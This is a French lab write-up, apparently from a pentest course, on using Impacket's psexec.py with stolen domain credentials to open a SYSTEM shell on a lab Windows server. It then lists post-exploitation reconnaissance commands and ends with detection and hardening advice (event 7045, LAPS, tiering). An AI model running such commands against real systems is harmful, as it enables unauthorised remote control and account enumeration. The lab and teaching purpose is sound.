# V.2 Outil principal : Impacket - `psexec.py`

## V.2.1 Présentation

`psexec.py` (Impacket) permet l’exécution de commandes à distance via SMB avec :
- Des identifiants valides ;
- Des privilèges administrateur local.
## V.2.2 Mise en œuvre

**Installation :**
```bash
sudo apt install impacket-scripts -y
```

Localisation du script :
```bash
find /usr -name "psexec.py" 2>/dev/null
```
**Exécution de psexec.py**

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py -codec cp850 cyber.lan/jules.ferry:abcd1234@@192.168.1.30
```

![](../assets/images/Pasted-image-20260109122957.png)

**Résultat observé :** ouverture d’un shell interactif exécuté dans le contexte NT AUTHORITY\SYSTEM.

**Explications :**

| Paramètre               | Description                         |
| ----------------------- | ----------------------------------- |
| `cyber.lan/jules.ferry` | Compte utilisateur du domaine       |
| `abcd1234@`             | Mot de passe valide                 |
| `192.168.1.30`          | Serveur cible                       |
| `-codec cp850`          | Correction des problèmes d’encodage |

**Résultats obtenus :**
- Shell distant ouvert ;
- Exécution de commandes avec droits élevés ;
- Contrôle total du serveur compromis.

Le script crée temporairement un service Windows distant pour exécuter les commandes, ce qui peut générer des événements de type 7045 (création de service) dans les journaux système.

## V.2.3 Actions de post-exploitation

### V.2.3.1 Reconnaissance système

| Commande                        | Finalité                          |
| ------------------------------- | --------------------------------- |
| `whoami`                        | Identifier l’utilisateur courant  |
| `whoami /groups`                | Lister les groupes d’appartenance |
| `hostname`                      | Nom de la machine                 |
| `ipconfig`                      | Configuration réseau              |
| `systeminfo`                    | Informations système              |
| `tasklist`                      | Processus en cours                |
| `net user`                      | Comptes locaux                    |
| `net user /domain`              | Comptes du domaine                |
| `net localgroup administrators` | Administrateurs locaux            |
## V.2.4 Conclusion intermédiaire

L’obtention d’un accès administrateur distant via PsExec démontre qu’un compte compromis disposant de privilèges administrateur locaux suffit à compromettre entièrement un serveur Windows, sans exploitation de vulnérabilité logicielle.

Cette situation représente un risque critique dans les environnements où les comptes administrateurs locaux sont réutilisés, insuffisamment segmentés ou non protégés par des mécanismes tels que LAPS ou le modèle de tiering administratif.

